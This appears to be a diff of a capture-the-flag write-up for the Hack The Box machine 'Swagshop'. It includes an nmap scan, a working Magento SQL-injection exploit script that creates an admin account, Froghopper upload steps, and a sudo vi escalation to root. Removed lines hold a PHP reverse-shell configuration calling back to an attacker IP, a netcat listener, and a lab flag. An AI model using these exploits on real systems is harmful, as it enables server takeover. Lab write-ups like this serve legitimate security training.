@@ -1,25 +1,165 @@
-inet 10.10.15.219  netmask 255.255.254.0  destination 10.10.15.219
+Swagshop
 
-cat php-reverse-shell.phtml
-set_time_limit (0);
-$VERSION = "1.0";
-$ip = '10.10.15.219';  // CHANGE THIS
-$port = 1234;       // CHANGE THIS
-$chunk_size = 1400;
-$write_a = null;
-$error_a = null;
-$shell = 'uname -a; w; id; /bin/sh -i';
-$daemon = 0;
-$debug = 0;
+## Enum
+Lets enumerate
+```bash
+nmap -sC -sV 
+# Nmap 7.70 scan initiated Thu Aug 29 15:03:29 2019 as: nmap -sC -sV -oA nmap 10.10.10.140
+Nmap scan report for ip-10-10-10-140.ap-south-1.compute.internal (10.10.10.140)
+Host is up (0.23s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 b6:55:2b:d2:4e:8f:a3:81:72:61:37:9a:12:f6:24:ec (RSA)
+|_  256 4c:50:d5:f2:70:c5:fd:c4:b2:f0:bc:42:20:32:64:34 (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Did not follow redirect to http://10.10.10.140/
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
-root@kali:~/Desktop# nc -lvp 1234
-listening on [any] 1234 ...
-connect to [10.10.15.219] from ip-10-10-10-140.ap-south-1.compute.internal [10.10.10.140] 47640
-Linux swagshop 4.4.0-146-generic #172-Ubuntu SMP Wed Apr 3 09:00:08 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
- 05:08:38 up 20 min,  0 users,  load average: 0.00, 0.05, 0.05
-USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
-uid=33(www-data) gid=33(www-data) groups=33(www-data)
-/bin/sh: 0: can't access tty; job control turned off
-$ 
-cat user.txt
-a448877277e82f05e5ddf9f90aefbac8
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Thu Aug 29 15:04:15 2019 -- 1 IP address (1 host up) scanned in 45.63 seconds
+```
+
+Ran directory buster
+
+found 
+
+searched on  exploit db
+Found multiple magento vulnerabilities on exploit db
+
+## Vulnerability
+ Tried many but found one that works
+ 
+[Link](https://www.exploit-db.com/exploits/37977)
+
+```python
+import requests
+import base64
+import sys
+
+target = "http://10.10.10.140/"
+
+if not target.startswith("http"):
+    target = "http://" + target
+
+if target.endswith("/"):
+    target = target[:-1]
+
+target_url = target + "/index.php/admin/Cms_Wysiwyg/directive/index/"
+
+q="""
+SET @SALT = 'rp';
+SET @PASS = CONCAT(MD5(CONCAT( @SALT , '{password}') ), CONCAT(':', @SALT ));
+SELECT @EXTRA := MAX(extra) FROM admin_user WHERE extra IS NOT NULL;
+INSERT INTO `admin_user` (`firstname`, `lastname`,`email`,`username`,`password`,`created`,`lognum`,`reload_acl_flag`,`is_active`,`extra`,`rp_token`,`rp_token_created_at`) VALUES ('Firstname','Lastname','email@example.com','{username}',@PASS,NOW(),0,0,1,@EXTRA,NULL, NOW());
+INSERT INTO `admin_role` (parent_id,tree_level,sort_order,role_type,user_id,role_name) VALUES (1,2,0,'U',(SELECT user_id FROM admin_user WHERE username = '{username}'),'Firstname');
+"""
+
+
+query = q.replace("\n", "").format(username="joe123", password="forme")
+pfilter = "popularity[from]=0&popularity[to]=3&popularity[field_expr]=0);{0}".format(query)
+
+# e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ decoded is{{block type=Adminhtml/report_search_grid output=getCsvFile}}
+#print target_url
+r = requests.post(target_url, 
+                  data={"___directive": "e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ",
+                        "filter": base64.b64encode(pfilter),
+                        "forwarded": 1})
+if r.ok:
+    print "WORKED"
+    print "Check {0}/admin with creds forme:forme".format(target)
+else:
+    print "DID NOT WORK"
+
+ ```
+ 
+ So i added a user joe123
+ lets login
+ after browsing around found nothing useful
+ searched and found magento froghpper vuln [Linl](https://www.foregenix.com/blog/anatomy-of-a-magento-attack-froghopper)
+ 
+ 1. change developer settings
+ 2. upload file
+ 3. create template
+ 4. start netcat
+ 5. preview the template
+ 6. and we have a shell
+ 
+## Priv esc
+## Enum again for root
+ ```
+ 
+User www-data may run the following commands on swagshop:
+    (root) NOPASSWD: /usr/bin/vi /var/www/html/*
+
+
+[00;33m[+] Possible sudo pwnage![00m
+/usr/bin/vi
+
+```
+so lets try pwning using vim
+
+```
+$ sudo /usr/bin/vi /var/www/html/test1
+Vim: Warning: Output is not to a terminal
+Vim: Warning: Input is not from a terminal
+
+E558: Terminal entry not found in terminfo
+'unknown' not known. Available builtin terminals are:
+    builtin_amiga
+    builtin_beos-ansi
+    builtin_ansi
+    builtin_pcansi
+    builtin_win32
+    builtin_vt320
+    builtin_vt52
+    builtin_xterm
+    builtin_iris-ansi
+    builtin_debug
+    builtin_dumb
+defaulting to 'ansi'
+
+:shell  
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~
+~
+:shell
+
+id
+uid=0(root) gid=0(root) groups=0(root)
+cd /root
+ls
+root.txt
+ls -la
+cat root.txt
+c2b087d66e14********************
+
+   ___ ___
+ /| |/|\| |\
+/_| Â´ |.` |_\           We are open! (Almost)
+  |   |.  |
+  |   |.  |         Join the beta HTB Swag Store!
+  |___|.__|       https://hackthebox.store/password
+
+                   PS: Use root flag as password!
+                   
+```
+## Solved
